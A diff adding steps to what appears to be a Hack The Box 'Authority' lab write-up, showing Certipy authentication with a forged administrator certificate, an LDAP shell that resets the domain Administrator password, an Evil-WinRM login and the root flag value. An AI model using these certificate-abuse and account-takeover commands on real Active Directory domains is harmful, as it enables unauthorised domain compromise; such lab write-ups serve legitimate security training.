@@ -771,6 +771,64 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 ```
 
+```
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56        
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@authority.htb'
+[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
+[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
+[*] Using principal: 'administrator@authority.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+
+```
+
+```
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@authority.htb'
+[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
+[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
+[*] Connecting to 'ldaps://10.129.229.56:636'
+[*] Authenticated to '10.129.229.56' as: 'u:HTB\\Administrator'
+Type help for list of commands
+
+# change_password administrator "Password123!"
+Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
+Attempting to set new password of: Password123!
+Password changed successfully!
+
+# exit
+Bye!
+                                              
+```
+
+### root flag
+
+```
+evil-winrm -i authority.htb -u 'Administrator' -p 'Password123!'               
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                            
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+e59958e37b3976514d904d4e4973eefa
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+```
+
 ---
 ## Remediation
 
